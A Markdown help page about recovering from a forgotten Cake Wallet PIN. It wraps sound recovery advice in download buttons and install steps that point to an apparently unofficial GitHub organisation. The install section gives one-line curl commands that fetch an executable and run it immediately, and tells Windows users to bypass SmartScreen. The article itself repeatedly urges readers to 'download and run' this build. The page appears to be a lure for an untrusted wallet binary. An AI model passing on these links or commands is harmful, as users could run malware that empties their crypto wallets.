![Cake Wallet forgot pin guide](assets/cake-wallet-forgot-pin-article-banner.png)

# Forgot Your Cake Wallet PIN? What to Do

There is no reset. Here is the only route back, and what not to delete.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

There is no PIN reset in Cake Wallet. Restore the wallet from its recovery phrase, or from an encrypted backup if you made one. The "banned for N minutes" screen after several wrong attempts is a delay, not a lockout you can clear by reinstalling. Do not delete the app before you have the phrase in hand.

<!-- ARTICLE-BODY-BEGIN -->

## Get the current build first
If the problem is a build that will not accept the PIN at all, updating is worth one attempt before you assume the PIN is lost. Install the current release over the existing install, keeping the data, and try again once.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>. Never uninstall first: on most platforms uninstalling removes the wallet data, and that turns a recoverable situation into one that depends entirely on your backup.

## There is no PIN recovery
The PIN protects access on the device; it is not a key and it cannot be reset by the project. The way back in is a restore: install the app, choose Restore Wallet, and enter the recovery phrase or the encrypted backup.

That restore creates a working wallet with the same keys. It does not need the old PIN, and it does not need the old device. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore your wallet in Cake Wallet</a> lists the five backup types and which restore option each one uses.

## What "banned for N minutes" means
After several wrong attempts the app refuses input for a few minutes and shows "Failed authentication. Banned for N minutes" with a countdown. That is a deliberate delay against guessing, and it clears by itself. Waiting is the fix; reinstalling, rebooting or changing the clock does not shorten it.

The delay is also a warning: if you cannot remember the PIN, more attempts will not recover it. Stop and go to the phrase.

## Where the wallet data lives
The wallet, its history and its PIN live in the app's own storage on the device. A device backup may include that data, but it is not a portable wallet backup and it will not help on a different platform.

Multiple wallets mean multiple PIN-protected entries under one app lock. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Multiple wallets in Cake Wallet</a> explains which parts are shared and which are not, so you know what a restore will bring back.

## Before you delete anything
Find the phrase first. If the wallet is on a phone that still opens with a fingerprint or face unlock, use that to reach the backup section rather than guessing the PIN.

Then write the words down and read them back. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet recovery phrase</a> explains where the phrase sits inside a wallet and why one phrase does not cover a second wallet. Only after that should the old install be removed.

## Quick triage
| Symptom | Cause | Fix |
| --- | --- | --- |
| Countdown rejects every PIN | Too many wrong attempts | Wait for the timer to expire |
| PIN forgotten, phone still unlocks | Fingerprint or face unlock is available | Use it to reach the backup section |
| No unlock method left | There is no PIN recovery | Restore from the phrase |

If the app will not open at all after an update, <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">download and run the current release</a> before you delete or reinstall anything.

## FAQ
### Can I recover a wallet without the seed phrase?
No. Without the phrase or an encrypted backup there is no route back into the wallet.
### How do I reinstall Cake Wallet?
Install the current build; on desktop this replaces the app and keeps data. On mobile, uninstalling removes data, so restore afterwards from your phrase.
### Does the countdown reset if I restart the app?
No. The delay is stored with the app and expires on its own.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore your wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [Cake Wallet recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [multiple wallets in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
